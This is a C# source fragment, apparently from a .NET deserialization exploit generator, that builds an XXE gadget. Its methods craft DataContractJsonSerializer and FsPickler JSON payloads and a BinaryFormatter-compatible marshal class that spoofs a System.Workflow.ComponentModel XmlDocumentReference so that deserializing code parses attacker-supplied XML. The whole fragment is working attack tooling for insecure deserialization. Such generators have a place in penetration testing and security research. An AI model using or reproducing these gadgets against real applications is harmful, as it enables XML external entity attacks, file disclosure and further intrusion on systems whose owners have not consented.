    <" + InnerXmlMemberName + @">" + EscapeForXmlText(xml, rawInput) + @"</" + InnerXmlMemberName + @">
  </" + CarrierContractName + @">
</root>";
        }

        // DataContractJsonSerializer's document names no type whatsoever - the CONSUMER's
        // declared root type decides what is built - so the payload is just the member set.
        // The template quotes with DOUBLE quotes, so it escapes with EscapeForJsonDoubleQuoted.
        // EscapeForJson would also write an apostrophe as \', which is not legal JSON.
        private string BuildDataContractJsonPayload(string xml)
        {
            return @"{""" + InnerXmlMemberName + @""":""" + EscapeForJsonDoubleQuoted(xml, rawInput) + @"""}";
        }

        // FsPickler's JSON form for a plain [Serializable] type is the type record plus an
        // "instance" object holding the fields by name. That shape was taken from what FsPickler
        // itself emits for a stand-in with this carrier's exact shape, not guessed.
        private string BuildFsPicklerPayload(string xml)
        {
            return @"{
  ""FsPickler"": ""4.0.0"",
  ""type"": ""System.Object"",
  ""value"": {
    ""_flags"": ""subtype"",
    ""subtype"": {
      ""Case"": ""NamedType"",
      ""Name"": """ + CarrierClrName + @""",
      ""Assembly"": {
        ""Name"": ""System.Workflow.ComponentModel"",
        ""Version"": ""4.0.0.0"",
        ""Culture"": ""neutral"",
        ""PublicKeyToken"": ""31bf3856ad364e35""
      }
    },
    ""instance"": {
      """ + InnerXmlMemberName + @""": """ + EscapeForJsonDoubleQuoted(xml, rawInput) + @"""
    }
  }
}";
        }
    }

    // Emits the workflow XmlDocumentReference without ever constructing one.
    //
    // The carrier is a plain [Serializable] type, NOT ISerializable, so BinaryFormatter,
    // SoapFormatter and LosFormatter restore its single private field by NAME from the member
    // record this marshal writes, and then ObjectManager runs the IObjectReference fixup.
    // info.SetType is what puts the carrier's identity on the wire in place of this class's.
    //
    // The member name is the FIELD name, "innerXml", which is what GetRealObject reads.
    //
    // Internal on purpose and declared as a sibling of the generator rather than nested inside
    // it: NetDataContractSerializer names an element after the serialized object's own data
    // contract, and a nested type's contract name carries its outer type, so a marshal declared
    // inside the generator class would put the generator's name in every NDCS payload. This
    // gadget hand writes its NDCS document, but the rule is worth keeping uniform.
    [Serializable]
    internal sealed class XmlDocumentReferenceMarshal : ISerializable
    {
        private readonly string _innerXml;

        internal XmlDocumentReferenceMarshal(string innerXml)
        {
            _innerXml = innerXml;
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(Type.GetType(XmlDocumentSurrogateXxeGenerator.CarrierTypeName, true));
            info.AddValue(XmlDocumentSurrogateXxeGenerator.InnerXmlMemberName, _innerXml);
        }
    }
}
